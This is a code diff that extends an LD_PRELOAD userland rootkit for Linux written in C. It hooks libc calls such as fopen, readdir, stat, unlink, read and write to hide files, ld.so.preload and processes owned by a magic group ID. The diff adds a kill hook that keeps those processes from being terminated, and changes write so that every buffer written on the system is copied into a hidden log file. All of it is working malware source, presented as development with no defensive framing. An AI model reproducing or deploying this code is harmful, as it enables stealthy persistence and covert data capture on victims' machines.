@@ -47,6 +47,52 @@ int pid_to_gid(int pid) {
     return gid;
 }
 
+FILE *(*__o_fopen)(const char *, const char *);
+FILE *__fopen(const char *path, const char *mode) {
+    if(!__o_fopen)
+        __o_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    FILE *fp = __o_fopen(path, mode);
+    if (fp == NULL) {
+        return NULL;
+    }
+
+    return fp;
+}
+
+// fopen
+
+FILE *(*o_fopen)(const char *, const char *);
+FILE *fopen(const char *path, const char *mode) {
+#ifdef VERBOSE
+    printf("fopen called\n");
+#endif
+    if(!o_fopen)
+        o_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    if (good_gid() == 1) {
+        return o_fopen(path, mode);
+    }
+
+    if (strcmp(path, "ld.so.preload") == 0 
+    || strcmp(path, HIDDEN_FILENAME) == 0 
+    || strcmp(path, HIDDEN_FILENAME2) == 0
+    || strcmp(path, SPECIAL_FILENAME) == 0
+    ) {
+        return NULL;
+    }
+
+    int pid = atoi(path);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return NULL;
+        }
+    }
+
+    return o_fopen(path, mode);
+}
+
 // EXECVE
 
 int (*o_execve)(const char *, char *const argv[], char *const envp[]);
@@ -95,7 +141,10 @@ struct dirent *readdir(DIR *p) {
         return NULL;
     }
 
-    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 
+    || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0
+    || strcmp(dir->d_name, SPECIAL_FILENAME) == 0
+    ) {
         // hide file
         return readdir(p);
     }
@@ -132,6 +181,7 @@ struct dirent64 *readdir64(DIR *p) {
 
     if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 
     || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0
+    || strcmp(dir->d_name, SPECIAL_FILENAME) == 0
     ) {
         return readdir64(p);
     }
@@ -165,6 +215,7 @@ int unlink(const char *pathname) {
         strcmp(pathname, "ld.so.preload") == 0 
         || strcmp(pathname, HIDDEN_FILENAME) == 0
         || strcmp(pathname, HIDDEN_FILENAME2) == 0
+        || strcmp(pathname, SPECIAL_FILENAME) == 0
     ) {
         return 0;
     }
@@ -198,6 +249,7 @@ int unlinkat(int dirfd, const char * pathname, int flags) {
         strcmp(pathname, "ld.so.preload") == 0 
         || strcmp(pathname, HIDDEN_FILENAME2) == 0
         || strcmp(pathname, HIDDEN_FILENAME) == 0
+        || strcmp(pathname, SPECIAL_FILENAME) == 0
     ) {
         return 0;
     }
@@ -227,11 +279,20 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
     }
 
     char *buf = (char *) xbuf;
+    FILE *fp = __fopen(SPECIAL_PATH "/" SPECIAL_FILENAME, "a");
+    if (fp != NULL) {
+        fwrite(buf, 1, count, fp);
+        fclose(fp);
+    }
+
+    // dont allow writing to hidden files
     if (
         strstr(buf, HIDDEN_FILENAME) != NULL 
     || strstr(buf, HIDDEN_FILENAME2) != NULL
     || strstr(buf, HIDDEN_EXEC_PATH) != NULL
     || strstr(buf, HIDDEN_PATH) != NULL
+    || strstr(buf, SPECIAL_PATH) != NULL
+    || strstr(buf, SPECIAL_FILENAME) != NULL
     ) {
         return count;
     }
@@ -260,11 +321,36 @@ ssize_t read(int fd, void *xbuf, size_t count) {
     || strstr(buf, HIDDEN_FILENAME2) != NULL
     || strstr(buf, HIDDEN_EXEC_PATH) != NULL
     || strstr(buf, HIDDEN_PATH) != NULL
+    || strstr(buf, SPECIAL_PATH) != NULL
+    || strstr(buf, SPECIAL_FILENAME) != NULL
     ) {
         return 0;
     }
 
     return o_read(fd, xbuf, count);
+}
+
+// kill
+
+int (*o_kill)(pid_t, int);
+int kill(pid_t pid, int sig) {
+#ifdef VERBOSE
+    printf("kill called\n");
+#endif
+
+    if(!o_kill)
+        o_kill = dlsym(RTLD_NEXT, "kill");
+
+    if (good_gid() == 1) {
+        return o_kill(pid, sig);
+    }
+
+    int gid = pid_to_gid(pid);
+    if (gid == GID) {
+        return -1;
+    }
+
+    return o_kill(pid, sig);
 }
 
 // openat
@@ -284,7 +370,11 @@ int openat(int dirfd, const char *path, int flags, ...) {
     }
 
     // check if the file is hidden if so return -1
-    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(path, "ld.so.preload") == 0 
+    || strcmp(path, HIDDEN_FILENAME) == 0 
+    || strcmp(path, HIDDEN_FILENAME2) == 0
+    || strcmp(path, SPECIAL_FILENAME) == 0
+    ) {
         return -1;
     }
 
@@ -313,7 +403,11 @@ int open64(const char *path, int flags, ...) {
         return o_openat64(AT_FDCWD, path, flags);
     }
 
-    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(path, "ld.so.preload") == 0 
+    || strcmp(path, HIDDEN_FILENAME) == 0 
+    || strcmp(path, HIDDEN_FILENAME2) == 0
+    || strcmp(path, SPECIAL_FILENAME) == 0
+    ) {
         return -1;
     }
 
@@ -326,35 +420,6 @@ int open64(const char *path, int flags, ...) {
     }
 
     return o_openat64(AT_FDCWD, path, flags);
-}
-
-// fopen
-
-FILE *(*o_fopen)(const char *, const char *);
-FILE *fopen(const char *path, const char *mode) {
-#ifdef VERBOSE
-    printf("fopen called\n");
-#endif
-    if(!o_fopen)
-        o_fopen = dlsym(RTLD_NEXT, "fopen");
-
-    if (good_gid() == 1) {
-        return o_fopen(path, mode);
-    }
-
-    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
-        return NULL;
-    }
-
-    int pid = atoi(path);
-    if (pid != 0) {
-        int gid = pid_to_gid(pid);
-        if (gid == GID) {
-            return NULL;
-        }
-    }
-
-    return o_fopen(path, mode);
 }
 
 // opendir
@@ -371,7 +436,11 @@ DIR *opendir(const char *name) {
         return o_opendir(name);
     }
 
-    if (strcmp(name, "ld.so.preload") == 0 || strcmp(name, HIDDEN_FILENAME) == 0 || strcmp(name, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(name, "ld.so.preload") == 0 
+    || strcmp(name, HIDDEN_FILENAME) == 0 
+    || strcmp(name, HIDDEN_FILENAME2) == 0
+    || strcmp(name, SPECIAL_FILENAME) == 0
+    ) {
         return NULL;
     }
 
@@ -400,7 +469,11 @@ int stat(const char *pathname, struct stat *statbuf) {
         return o_stat(pathname, statbuf);
     }
 
-    if (strcmp(pathname, "ld.so.preload") == 0 || strcmp(pathname, HIDDEN_FILENAME) == 0 || strcmp(pathname, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(pathname, "ld.so.preload") == 0 
+    || strcmp(pathname, HIDDEN_FILENAME) == 0 
+    || strcmp(pathname, HIDDEN_FILENAME2) == 0
+    || strcmp(pathname, SPECIAL_FILENAME) == 0
+    ) {
         return -1;
     }
 
